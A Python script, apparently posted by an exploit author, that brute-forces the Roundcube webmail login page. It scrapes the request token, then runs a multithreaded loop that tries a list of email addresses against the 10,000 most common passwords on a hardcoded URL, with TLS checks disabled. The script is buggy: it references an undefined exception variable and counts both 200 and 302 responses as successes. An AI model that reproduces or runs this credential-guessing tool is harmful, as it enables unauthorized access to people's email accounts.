#!/bin/python3 
# Made by WafflesExploits
# This script was made to bypass the Login page of the "Roundcube webmail". 
# It start by grabbing the _token value by sending a get request. He uses this value to send a post request, bypassing the CSRF protection. The _token is like a CSRF token, since you need a new one everytime you try to login.

import concurrent.futures
import time
import requests
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

urllib3.disable_warnings()



# Enter Parameters HERE <---------------------
user_file = "emails_encoded.txt"
pass_file = "10k-most-common.txt"
url = 'https://pastamentor.tcm/mail/?_task=login'
threads_num = 5 # Number of threads to run





# Functions
res = requests.get(url,verify=False)
cookies = res.cookies

def parse_token(data): # Matches text from data based on regex pattern.
	pattern = 'request_token":"(.*)"'
	return re.findall(pattern, data)
	
def GetToken():
	return parse_token(res.text)[0]

def PostRequest(user, pwd):
    try:
        token = GetToken()
        res = requests.post(url, data={"_token": token, "_task": "login", "_action": "login", "_timezone": "Europe/Moscow","_url": "", "_user": user, "_pass": pwd}, cookies=cookies, allow_redirects=False, timeout=5, verify=False)
        print(f"Testing {user}:{pwd}")
        if (res.status_code in (302,200)): # Sucess if status code is 302/200
            print(f"Succes with {user}:{pwd}")

    except:
        print(ex)

def create_threads(username_list, password_list, max_threads=5):
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for username in username_list:
            for password in password_list:
                executor.submit(PostRequest, username, password)

# Start
currentDate = str(datetime.now())
StartTime = time.perf_counter()

user_list = open(user_file).read().split('\n') # Opens username wordlist and transforms it into a list ['user1','user2',..]
pass_list = open(pass_file).read().split('\n') # Same as the username wordlist, but for passwords.


    
create_threads(user_list, pass_list, max_threads=threads_num)
    
EndTime = time.perf_counter()
RunTime = EndTime - StartTime
print(f"* Finished scan in {round(RunTime, 3)}s.")
